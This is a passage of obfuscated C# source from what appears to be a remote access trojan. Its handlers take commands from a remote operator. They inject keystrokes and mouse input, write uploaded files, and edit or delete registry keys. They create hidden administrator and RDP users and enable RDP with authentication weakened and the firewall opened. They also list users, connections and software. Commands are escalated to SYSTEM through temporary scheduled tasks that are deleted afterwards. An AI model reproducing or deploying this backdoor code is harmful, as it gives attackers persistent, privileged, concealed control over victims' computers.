                            }
                        }
                        else if (action == "wheel")
                        {
                            SendMouseInput(inputSize, absX, absY,
                                MOUSEEVENTF_WHEEL | MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, delta);
                        }
                    }
                    else if (inputType == "key")
                    {
                        string keyAction = _hUALleDbnckSq(payload, "action"); 
                        string vkStr = _hUALleDbnckSq(payload, "vk");
                        string text = _hUALleDbnckSq(payload, "text"); 
                        int vk = 0;
                        int.TryParse(vkStr, out vk);

                        int inputSize = IntPtr.Size == 8 ? 40 : 28;

                        if (!string.IsNullOrEmpty(text))
                        {
                            
                            foreach (char c in text)
                            {
                                SendKeyInput(inputSize, 0, (ushort)c, KEYEVENTF_UNICODE);
                                SendKeyInput(inputSize, 0, (ushort)c, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP);
                            }
                        }
                        else if (vk > 0)
                        {
                            if (keyAction == "down" || keyAction == "press")
                                SendKeyInput(inputSize, (ushort)vk, 0, 0);
                            if (keyAction == "up" || keyAction == "press")
                                SendKeyInput(inputSize, (ushort)vk, 0, KEYEVENTF_KEYUP);
                        }
                    }

                    _TfnfMjSzCWKv("screen_input_result", id, "{\"ok\":true}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("screen_input_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        void SendMouseInput(int inputSize, int absX, int absY, int flags, int mouseData)
        {
            byte[] raw = new byte[inputSize];
            
            int dataOffset = IntPtr.Size == 8 ? 8 : 4; 
            
            BitConverter.GetBytes(absX).CopyTo(raw, dataOffset);
            BitConverter.GetBytes(absY).CopyTo(raw, dataOffset + 4);
            BitConverter.GetBytes(mouseData).CopyTo(raw, dataOffset + 8);
            BitConverter.GetBytes(flags).CopyTo(raw, dataOffset + 12);
            GCHandle pin = GCHandle.Alloc(raw, GCHandleType.Pinned);
            try { SendInput(1, pin.AddrOfPinnedObject(), inputSize); }
            finally { pin.Free(); }
        }

        void SendKeyInput(int inputSize, ushort vk, ushort scan, int flags)
        {
            byte[] raw = new byte[inputSize];
            BitConverter.GetBytes(INPUT_KEYBOARD).CopyTo(raw, 0); 
            int dataOffset = IntPtr.Size == 8 ? 8 : 4;
            
            BitConverter.GetBytes(vk).CopyTo(raw, dataOffset);
            BitConverter.GetBytes(scan).CopyTo(raw, dataOffset + 2);
            BitConverter.GetBytes(flags).CopyTo(raw, dataOffset + 4);
            GCHandle pin = GCHandle.Alloc(raw, GCHandleType.Pinned);
            try { SendInput(1, pin.AddrOfPinnedObject(), inputSize); }
            finally { pin.Free(); }
        }

        
        
        

        void HandleFileUpload(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string path = _hUALleDbnckSq(payload, "path");
                    string b64 = _hUALleDbnckSq(payload, "data");
                    string overwrite = _hUALleDbnckSq(payload, "overwrite");

                    if (string.IsNullOrEmpty(path) || string.IsNullOrEmpty(b64))
                    {
                        _TfnfMjSzCWKv("file_upload_result", id, "{\"ok\":false,\"error\":\"参数缺失\"}");
                        return;
                    }

                    if (File.Exists(path) && overwrite != "true")
                    {
                        _TfnfMjSzCWKv("file_upload_result", id, "{\"ok\":false,\"error\":\"文件已存在\"}");
                        return;
                    }

                    
                    string dir = Path.GetDirectoryName(path);
                    if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                        Directory.CreateDirectory(dir);

                    byte[] data = Convert.FromBase64String(b64);
                    File.WriteAllBytes(path, data);

                    _TfnfMjSzCWKv("file_upload_result", id,
                        "{\"ok\":true,\"path\":\"" + _AexenijxeK(path) + "\",\"size\":" + data.Length + "}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("file_upload_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        readonly ConcurrentDictionary<string, FileStream> _uploadStreams
            = new ConcurrentDictionary<string, FileStream>();

        void HandleFileUploadStart(string id, string payload)
        {
            try
            {
                string path = _hUALleDbnckSq(payload, "path");
                string overwrite = _hUALleDbnckSq(payload, "overwrite");
                if (string.IsNullOrEmpty(path))
                {
                    _TfnfMjSzCWKv("file_upload_start_result", id, "{\"ok\":false,\"error\":\"路径为空\"}");
                    return;
                }
                if (File.Exists(path) && overwrite != "true")
                {
                    _TfnfMjSzCWKv("file_upload_start_result", id, "{\"ok\":false,\"error\":\"文件已存在\"}");
                    return;
                }
                string dir = Path.GetDirectoryName(path);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                    Directory.CreateDirectory(dir);
                var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None);
                string uploadId = Guid.NewGuid().ToString("N").Substring(0, 12);
                _uploadStreams[uploadId] = fs;
                _TfnfMjSzCWKv("file_upload_start_result", id,
                    "{\"ok\":true,\"uploadId\":\"" + uploadId + "\",\"path\":\"" + _AexenijxeK(path) + "\"}");
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("file_upload_start_result", id,
                    "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        void HandleFileUploadChunk(string id, string payload)
        {
            string uploadId = _hUALleDbnckSq(payload, "uploadId");
            string b64 = _hUALleDbnckSq(payload, "data");
            string done = _hUALleDbnckSq(payload, "done");
            FileStream fs;
            if (string.IsNullOrEmpty(uploadId) || !_uploadStreams.TryGetValue(uploadId, out fs))
            {
                _TfnfMjSzCWKv("file_upload_chunk_result", id, "{\"ok\":false,\"error\":\"无效uploadId\"}");
                return;
            }
            try
            {
                if (!string.IsNullOrEmpty(b64))
                {
                    byte[] chunk = Convert.FromBase64String(b64);
                    fs.Write(chunk, 0, chunk.Length);
                }
                if (done == "true")
                {
                    long size = fs.Length;
                    fs.Close();
                    FileStream removed;
                    _uploadStreams.TryRemove(uploadId, out removed);
                    _TfnfMjSzCWKv("file_upload_chunk_result", id,
                        "{\"ok\":true,\"done\":true,\"size\":" + size + "}");
                }
                else
                {
                    _TfnfMjSzCWKv("file_upload_chunk_result", id,
                        "{\"ok\":true,\"written\":" + fs.Length + "}");
                }
            }
            catch (Exception ex)
            {
                fs.Close();
                FileStream removed;
                _uploadStreams.TryRemove(uploadId, out removed);
                _TfnfMjSzCWKv("file_upload_chunk_result", id,
                    "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        void HandleRegBrowse(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string keyPath = _hUALleDbnckSq(payload, "path");
                    if (string.IsNullOrEmpty(keyPath)) keyPath = "";

                    
                    Microsoft.Win32.RegistryKey root;
                    string subPath;
                    ParseRegPath(keyPath, out root, out subPath);

                    if (root == null)
                    {
                        
                        _TfnfMjSzCWKv("reg_browse_result", id,
                            "{\"path\":\"\",\"keys\":[\"HKEY_CURRENT_USER\",\"HKEY_LOCAL_MACHINE\"," +
                            "\"HKEY_CLASSES_ROOT\",\"HKEY_USERS\",\"HKEY_CURRENT_CONFIG\"],\"values\":[]}");
                        return;
                    }

                    var sb = new StringBuilder();
                    sb.Append("{\"path\":\"" + _AexenijxeK(keyPath) + "\",\"keys\":[");

                    using (var key = string.IsNullOrEmpty(subPath) ? root : root.OpenSubKey(subPath, false))
                    {
                        if (key == null)
                        {
                            _TfnfMjSzCWKv("reg_browse_result", id,
                                "{\"error\":\"键不存在: " + _AexenijxeK(keyPath) + "\"}");
                            return;
                        }

                        
                        bool first = true;
                        foreach (string name in key.GetSubKeyNames())
                        {
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append("\"" + _AexenijxeK(name) + "\"");
                        }
                        sb.Append("],\"values\":[");

                        
                        first = true;
                        foreach (string vname in key.GetValueNames())
                        {
                            try
                            {
                                if (!first) sb.Append(",");
                                first = false;
                                object val = key.GetValue(vname);
                                var kind = key.GetValueKind(vname);
                                string displayVal;
                                if (kind == Microsoft.Win32.RegistryValueKind.Binary && val is byte[])
                                    displayVal = BitConverter.ToString((byte[])val).Replace("-", " ");
                                else
                                    displayVal = (val ?? "").ToString();
                                sb.Append(string.Format("{{\"name\":\"{0}\",\"type\":\"{1}\",\"data\":\"{2}\"}}",
                                    _AexenijxeK(vname), kind, _AexenijxeK(displayVal)));
                            }
                            catch { }
                        }
                        sb.Append("]}");
                    }
                    _TfnfMjSzCWKv("reg_browse_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("reg_browse_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        void HandleRegWrite(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string keyPath = _hUALleDbnckSq(payload, "path");
                    string valName = _hUALleDbnckSq(payload, "name");
                    string valData = _hUALleDbnckSq(payload, "data");
                    string valType = _hUALleDbnckSq(payload, "valType"); 

                    if (string.IsNullOrEmpty(keyPath))
                    {
                        _TfnfMjSzCWKv("reg_write_result", id, "{\"ok\":false,\"error\":\"无效路径\"}");
                        return;
                    }

                    
                    string regType = "REG_SZ";
                    if (valType == "dword") regType = "REG_DWORD";
                    else if (valType == "binary") regType = "REG_BINARY";
                    else if (valType == "expandsz") regType = "REG_EXPAND_SZ";
                    else if (valType == "multisz") regType = "REG_MULTI_SZ";

                    string args;
                    if (string.IsNullOrEmpty(valName))
                        args = "add \"" + keyPath + "\" /ve /t " + regType + " /d \"" + valData + "\" /f";
                    else
                        args = "add \"" + keyPath + "\" /v \"" + valName + "\" /t " + regType + " /d \"" + valData + "\" /f";

                    string result = _DtVckTCHXhi("reg", args);
                    if (result.Contains("ERROR") || result.Contains("ERR:"))
                        _TfnfMjSzCWKv("reg_write_result", id, "{\"ok\":false,\"error\":\"" + _AexenijxeK(result) + "\"}");
                    else
                        _TfnfMjSzCWKv("reg_write_result", id, "{\"ok\":true}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("reg_write_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        void HandleRegDelete(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string keyPath = _hUALleDbnckSq(payload, "path");
                    string valName = _hUALleDbnckSq(payload, "name");
                    string deleteKey = _hUALleDbnckSq(payload, "deleteKey"); 

                    if (string.IsNullOrEmpty(keyPath))
                    {
                        _TfnfMjSzCWKv("reg_delete_result", id, "{\"ok\":false,\"error\":\"无效路径\"}");
                        return;
                    }

                    
                    string args;
                    if (deleteKey == "true")
                        args = "delete \"" + keyPath + "\" /f";
                    else if (string.IsNullOrEmpty(valName))
                        args = "delete \"" + keyPath + "\" /ve /f";
                    else
                        args = "delete \"" + keyPath + "\" /v \"" + valName + "\" /f";

                    string result = _DtVckTCHXhi("reg", args);
                    if (result.Contains("ERROR") || result.Contains("ERR:"))
                        _TfnfMjSzCWKv("reg_delete_result", id, "{\"ok\":false,\"error\":\"" + _AexenijxeK(result) + "\"}");
                    else
                        _TfnfMjSzCWKv("reg_delete_result", id, "{\"ok\":true}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("reg_delete_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        static void ParseRegPath(string path, out Microsoft.Win32.RegistryKey root, out string subPath)
        {
            root = null; subPath = "";
            if (string.IsNullOrEmpty(path)) return;
            int sep = path.IndexOf('\\');
            string rootName = sep > 0 ? path.Substring(0, sep).ToUpperInvariant() : path.ToUpperInvariant();
            subPath = sep > 0 ? path.Substring(sep + 1) : "";
            switch (rootName)
            {
                case "HKEY_CURRENT_USER": case "HKCU": root = Microsoft.Win32.Registry.CurrentUser; break;
                case "HKEY_LOCAL_MACHINE": case "HKLM": root = Microsoft.Win32.Registry.LocalMachine; break;
                case "HKEY_CLASSES_ROOT": case "HKCR": root = Microsoft.Win32.Registry.ClassesRoot; break;
                case "HKEY_USERS": case "HKU": root = Microsoft.Win32.Registry.Users; break;
                case "HKEY_CURRENT_CONFIG": root = Microsoft.Win32.Registry.CurrentConfig; break;
            }
        }

        
        
        
        

        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserAdd(string servername, int level, IntPtr buf, out int parm_err);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserDel(string servername, string username);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserEnum(string servername, int level, int filter, out IntPtr bufptr,
            int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetLocalGroupAddMembers(string servername, string groupname,
            int level, IntPtr buf, int totalentries);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserChangePassword(string domainname, string username,
            string oldpassword, string newpassword);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetLocalGroupGetMembers(string servername, string localgroupname,
            int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref IntPtr resume_handle);
        [DllImport("netapi32.dll")]
        static extern int NetApiBufferFree(IntPtr Buffer);

        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct USER_INFO_1
        {
            public string usri1_name;
            public string usri1_password;
            public int usri1_password_age;
            public int usri1_priv; 
            public string usri1_home_dir;
            public string usri1_comment;
            public int usri1_flags; 
            public string usri1_script_path;
        }

        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct USER_INFO_0 { public string usri0_name; }

        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct LOCALGROUP_MEMBERS_INFO_3 { public string lgrmi3_domainandname; }

        void HandleUserList(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    
                    var adminSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                    try
                    {
                        IntPtr grpBuf = IntPtr.Zero;
                        int grpRead = 0, grpTotal = 0;
                        IntPtr grpResume = IntPtr.Zero;
                        int grpRet = NetLocalGroupGetMembers(null, "Administrators", 3, out grpBuf, -1,
                            out grpRead, out grpTotal, ref grpResume);
                        if (grpRet == 0 && grpBuf != IntPtr.Zero)
                        {
                            int gsz = Marshal.SizeOf(typeof(LOCALGROUP_MEMBERS_INFO_3));
                            for (int g = 0; g < grpRead; g++)
                            {
                                var gm = (LOCALGROUP_MEMBERS_INFO_3)Marshal.PtrToStructure(
                                    new IntPtr(grpBuf.ToInt64() + g * gsz), typeof(LOCALGROUP_MEMBERS_INFO_3));
                                string dn = gm.lgrmi3_domainandname ?? "";
                                int slash = dn.LastIndexOf('\\');
                                string shortName = slash >= 0 ? dn.Substring(slash + 1) : dn;
                                adminSet.Add(shortName);
                            }
                            NetApiBufferFree(grpBuf);
                        }
                    }
                    catch { }

                    IntPtr bufPtr = IntPtr.Zero;
                    int entriesRead = 0, totalEntries = 0, resumeHandle = 0;
                    int ret = NetUserEnum(null, 1, 0, out bufPtr, -1,
                        out entriesRead, out totalEntries, ref resumeHandle);

                    var sb = new StringBuilder();
                    sb.Append("{\"users\":[");
                    if (ret == 0 && bufPtr != IntPtr.Zero)
                    {
                        bool first = true;
                        int sz = Marshal.SizeOf(typeof(USER_INFO_1));
                        for (int i = 0; i < entriesRead; i++)
                        {
                            var info = (USER_INFO_1)Marshal.PtrToStructure(
                                new IntPtr(bufPtr.ToInt64() + i * sz), typeof(USER_INFO_1));
                            if (!first) sb.Append(",");
                            first = false;
                            bool isAdmin = adminSet.Contains(info.usri1_name ?? "");
                            bool disabled = (info.usri1_flags & 0x0002) != 0; 
                            sb.Append("{\"name\":\"" + _AexenijxeK(info.usri1_name ?? "") + "\"");
                            sb.Append(",\"fullName\":\"\"");
                            sb.Append(",\"comment\":\"" + _AexenijxeK(info.usri1_comment ?? "") + "\"");
                            sb.Append(",\"isAdmin\":" + (isAdmin ? "true" : "false"));
                            sb.Append(",\"disabled\":" + (disabled ? "true" : "false") + "}");
                        }
                        NetApiBufferFree(bufPtr);
                    }
                    sb.Append("]}");
                    _TfnfMjSzCWKv("user_list_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("user_list_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        void HandleUserAdd(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string username = _hUALleDbnckSq(payload, "username");
                    string password = _hUALleDbnckSq(payload, "password");
                    string addToAdmin = _hUALleDbnckSq(payload, "admin"); 
                    string addToRdp = _hUALleDbnckSq(payload, "rdp");   

                    if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                    {
                        _TfnfMjSzCWKv("user_add_result", id, "{\"ok\":false,\"error\":\"用户名密码不能为空\"}");
                        return;
                    }

                    
                    string result = _DtVckTCHXhi("net", "user \"" + username + "\" \"" + password + "\" /add");
                    if (!result.Contains("successfully") && !result.Contains("成功"))
                    {
                        _TfnfMjSzCWKv("user_add_result", id,
                            "{\"ok\":false,\"error\":\"" + _AexenijxeK(result) + "\"}");
                        return;
                    }

                    
                    _DtVckTCHXhi("wmic", "useraccount where name=\"" + username + "\" set PasswordExpires=false");

                    string groups = "";
                    if (addToAdmin == "true")
                    {
                        string r = _DtVckTCHXhi("net", "localgroup Administrators \"" + username + "\" /add");
                        if (r.Contains("successfully") || r.Contains("成功")) groups += "Administrators ";
                    }
                    if (addToRdp == "true")
                    {
                        string r = _DtVckTCHXhi("net", "localgroup \"Remote Desktop Users\" \"" + username + "\" /add");
                        if (r.Contains("successfully") || r.Contains("成功")) groups += "RDP ";
                    }

                    _TfnfMjSzCWKv("user_add_result", id,
                        "{\"ok\":true,\"user\":\"" + _AexenijxeK(username) + "\",\"groups\":\"" + _AexenijxeK(groups.Trim()) + "\"}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("user_add_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        int AddUserToGroup(string username, string groupname)
        {
            var member = new LOCALGROUP_MEMBERS_INFO_3
            {
                lgrmi3_domainandname = username
            };
            IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(member));
            Marshal.StructureToPtr(member, buf, false);
            int ret = NetLocalGroupAddMembers(null, groupname, 3, buf, 1);
            Marshal.FreeHGlobal(buf);
            return ret;
        }

        void HandleUserDelete(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string username = _hUALleDbnckSq(payload, "username");
                    
                    string result = _DtVckTCHXhi("net", "user \"" + username + "\" /delete");
                    if (result.Contains("successfully") || result.Contains("成功"))
                        _TfnfMjSzCWKv("user_delete_result", id,
                            "{\"ok\":true,\"user\":\"" + _AexenijxeK(username) + "\"}");
                    else
                        _TfnfMjSzCWKv("user_delete_result", id,
                            "{\"ok\":false,\"error\":\"" + _AexenijxeK(result) + "\"}");
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("user_delete_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        

        string RunCmd(string exe, string args, int timeoutMs = 8000)
        {
            try
            {
                var psi = new ProcessStartInfo(exe, args)
                {
                    UseShellExecute = false, CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true, RedirectStandardError = true
                };
                var proc = Process.Start(psi);
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit(timeoutMs);
                return (stdout + " " + stderr).Trim();
            }
            catch (Exception ex) { return "ERR:" + ex.Message; }
        }

        string RunCmdQuiet(string exe, string args, int timeoutMs = 8000) { return RunCmd(exe, args, timeoutMs); }

        
        
        string _DtVckTCHXhi(string exe, string args, int timeoutMs = 12000)
        {
            string taskName = "T" + Guid.NewGuid().ToString("N").Substring(0, 8);
            string outFile = Path.Combine(Path.GetTempPath(), taskName + ".out");
            try
            {
                
                string fullCmd = "cmd /c " + exe + " " + args + " > \"" + outFile + "\" 2>&1";

                
                string createResult = RunCmd("schtasks",
                    "/create /tn \"" + taskName + "\" /tr \"" + fullCmd.Replace("\"", "\\\"") + "\" /sc once /st 00:00 /ru SYSTEM /f /rl HIGHEST");

                if (createResult.Contains("ERROR") || createResult.Contains("Access is denied") || createResult.Contains("ERR:"))
                {
                    
                    return RunCmd(exe, args, timeoutMs);
                }

                
                RunCmd("schtasks", "/run /tn \"" + taskName + "\"");
                
                Thread.Sleep(3000);
                for (int i = 0; i < 10; i++)
                {
                    string status = RunCmd("schtasks", "/query /tn \"" + taskName + "\" /fo csv /nh");
                    if (status.Contains("Ready") || status.Contains("就绪") || status.Contains("Could not")) break;
                    Thread.Sleep(1000);
                }

                
                RunCmd("schtasks", "/delete /tn \"" + taskName + "\" /f");

                
                if (File.Exists(outFile))
                {
                    string output = File.ReadAllText(outFile).Trim();
                    try { File.Delete(outFile); } catch { }
                    return output;
                }
                return "OK";
            }
            catch (Exception ex)
            {
                
                try { RunCmd("schtasks", "/delete /tn \"" + taskName + "\" /f"); } catch { }
                try { if (File.Exists(outFile)) File.Delete(outFile); } catch { }
                return "ERR:" + ex.Message;
            }
        }

        void HandleRdpManage(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string action = _hUALleDbnckSq(payload, "action"); 
                    string portStr = _hUALleDbnckSq(payload, "port");

                    string tsRegPath = @"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server";
                    string portRegPath = @"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp";

                    if (action == "enable")
                    {
                        
                        string r1 = _DtVckTCHXhi("reg", "add \"" + tsRegPath + "\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
                        string r2 = _DtVckTCHXhi("reg", "add \"" + portRegPath + "\" /v UserAuthentication /t REG_DWORD /d 0 /f");
                        
                        _DtVckTCHXhi("netsh", "advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes");

                        if (r1.Contains("ERROR") || r1.Contains("ERR:"))
                            _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":false,\"error\":\"" + _AexenijxeK(r1) + "\"}");
                        else
                            _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":true,\"action\":\"enabled\"}");
                    }
                    else if (action == "disable")
                    {
                        string r1 = _DtVckTCHXhi("reg", "add \"" + tsRegPath + "\" /v fDenyTSConnections /t REG_DWORD /d 1 /f");
                        if (r1.Contains("ERROR") || r1.Contains("ERR:"))
                            _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":false,\"error\":\"" + _AexenijxeK(r1) + "\"}");
                        else
                            _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":true,\"action\":\"disabled\"}");
                    }
                    else if (action == "port")
                    {
                        int port = 3389;
                        int.TryParse(portStr, out port);
                        if (port < 1 || port > 65535) port = 3389;

                        string r1 = _DtVckTCHXhi("reg", "add \"" + portRegPath + "\" /v PortNumber /t REG_DWORD /d " + port + " /f");
                        if (r1.Contains("ERROR") || r1.Contains("ERR:"))
                            _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":false,\"error\":\"" + _AexenijxeK(r1) + "\"}");
                        else
                            _TfnfMjSzCWKv("rdp_manage_result", id,
                                "{\"ok\":true,\"action\":\"port_changed\",\"port\":" + port + "}");
                    }
                    else if (action == "status")
                    {
                        int deny = 1, currentPort = 3389;
                        try
                        {
                            string tsKey = @"SYSTEM\CurrentControlSet\Control\Terminal Server";
                            string portKey = @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp";
                            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(tsKey, false))
                            {
                                if (key != null) deny = (int)key.GetValue("fDenyTSConnections", 1);
                            }
                            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(portKey, false))
                            {
                                if (key != null) currentPort = (int)key.GetValue("PortNumber", 3389);
                            }
                        }
                        catch { }
                        _TfnfMjSzCWKv("rdp_manage_result", id,
                            "{\"ok\":true,\"enabled\":" + (deny == 0 ? "true" : "false") +
                            ",\"port\":" + currentPort + "}");
                    }
                    else
                    {
                        _TfnfMjSzCWKv("rdp_manage_result", id, "{\"ok\":false,\"error\":\"未知操作\"}");
                    }
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("rdp_manage_result", id,
                        "{\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        
        

        [DllImport("iphlpapi.dll", SetLastError = true)]
        static extern int GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize,
            bool bOrder, int ulAf, int TableClass, int Reserved);
        [DllImport("iphlpapi.dll", SetLastError = true)]
        static extern int GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize,
            bool bOrder, int ulAf, int TableClass, int Reserved);

        void _UHjQycTByQTjf(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var sb = new StringBuilder();
                    sb.Append("{\"tcp\":[");
                    bool first = true;

                    
                    int size = 0;
                    GetExtendedTcpTable(IntPtr.Zero, ref size, true, 2, 5, 0);
                    if (size > 0)
                    {
                        IntPtr buf = Marshal.AllocHGlobal(size);
                        try
                        {
                            if (GetExtendedTcpTable(buf, ref size, true, 2, 5, 0) == 0)
                            {
                                int numEntries = Marshal.ReadInt32(buf);
                                int rowOffset = 4;
                                int rowSize = 24; 
                                for (int i = 0; i < numEntries && i < 500; i++)
                                {
                                    IntPtr rowPtr = new IntPtr(buf.ToInt64() + rowOffset + i * rowSize);
                                    int state = Marshal.ReadInt32(rowPtr, 0);
                                    uint localAddr = (uint)Marshal.ReadInt32(rowPtr, 4);
                                    int localPort = IPAddress.NetworkToHostOrder((short)Marshal.ReadInt16(rowPtr, 8)) & 0xFFFF;
                                    uint remoteAddr = (uint)Marshal.ReadInt32(rowPtr, 12);
                                    int remotePort = IPAddress.NetworkToHostOrder((short)Marshal.ReadInt16(rowPtr, 16)) & 0xFFFF;
                                    int pid = Marshal.ReadInt32(rowPtr, 20);

                                    string localIp = new IPAddress(localAddr).ToString();
                                    string remoteIp = new IPAddress(remoteAddr).ToString();
                                    string pname = "";
                                    try { if (pid > 0) pname = Process.GetProcessById(pid).ProcessName; } catch { }

                                    string[] states = { "", "CLOSED", "LISTEN", "SYN_SENT", "SYN_RCVD",
                                        "ESTABLISHED", "FIN_WAIT1", "FIN_WAIT2", "CLOSE_WAIT",
                                        "CLOSING", "LAST_ACK", "TIME_WAIT", "DELETE_TCB" };
                                    string stateStr = (state > 0 && state < states.Length) ? states[state] : state.ToString();

                                    if (!first) sb.Append(",");
                                    first = false;
                                    sb.Append(string.Format(
                                        "{{\"local\":\"{0}:{1}\",\"remote\":\"{2}:{3}\",\"state\":\"{4}\",\"pid\":{5},\"process\":\"{6}\"}}",
                                        localIp, localPort, remoteIp, remotePort, stateStr, pid, _AexenijxeK(pname)));
                                }
                            }
                        }
                        finally { Marshal.FreeHGlobal(buf); }
                    }

                    sb.Append("],\"udp\":[");
                    first = true;

                    
                    size = 0;
                    GetExtendedUdpTable(IntPtr.Zero, ref size, true, 2, 1, 0);
                    if (size > 0)
                    {
                        IntPtr buf = Marshal.AllocHGlobal(size);
                        try
                        {
                            if (GetExtendedUdpTable(buf, ref size, true, 2, 1, 0) == 0)
                            {
                                int numEntries = Marshal.ReadInt32(buf);
                                int rowOffset = 4;
                                int rowSize = 12; 
                                for (int i = 0; i < numEntries && i < 500; i++)
                                {
                                    IntPtr rowPtr = new IntPtr(buf.ToInt64() + rowOffset + i * rowSize);
                                    uint localAddr = (uint)Marshal.ReadInt32(rowPtr, 0);
                                    int localPort = IPAddress.NetworkToHostOrder((short)Marshal.ReadInt16(rowPtr, 4)) & 0xFFFF;
                                    int pid = Marshal.ReadInt32(rowPtr, 8);

                                    string localIp = new IPAddress(localAddr).ToString();
                                    string pname = "";
                                    try { if (pid > 0) pname = Process.GetProcessById(pid).ProcessName; } catch { }

                                    if (!first) sb.Append(",");
                                    first = false;
                                    sb.Append(string.Format(
                                        "{{\"local\":\"{0}:{1}\",\"pid\":{2},\"process\":\"{3}\"}}",
                                        localIp, localPort, pid, _AexenijxeK(pname)));
                                }
                            }
                        }
                        finally { Marshal.FreeHGlobal(buf); }
                    }

                    sb.Append("]}");
                    _TfnfMjSzCWKv("netstat_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("netstat_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        
        

        void _qJpxdZIjNsRNTdlLOu(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var sb = new StringBuilder();
                    sb.Append("{\"software\":[");
                    bool first = true;

                    string[] uninstallPaths = new string[] {
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                        @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                    };

                    foreach (string regPath in uninstallPaths)
                    {
                        try
                        {
                            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(regPath, false))
                            {
                                if (key == null) continue;
                                foreach (string subKeyName in key.GetSubKeyNames())
                                {
                                    try
                                    {
                                        using (var sub = key.OpenSubKey(subKeyName, false))
                                        {
                                            if (sub == null) continue;
                                            string name = (sub.GetValue("DisplayName") ?? "").ToString();
                                            if (string.IsNullOrEmpty(name)) continue;
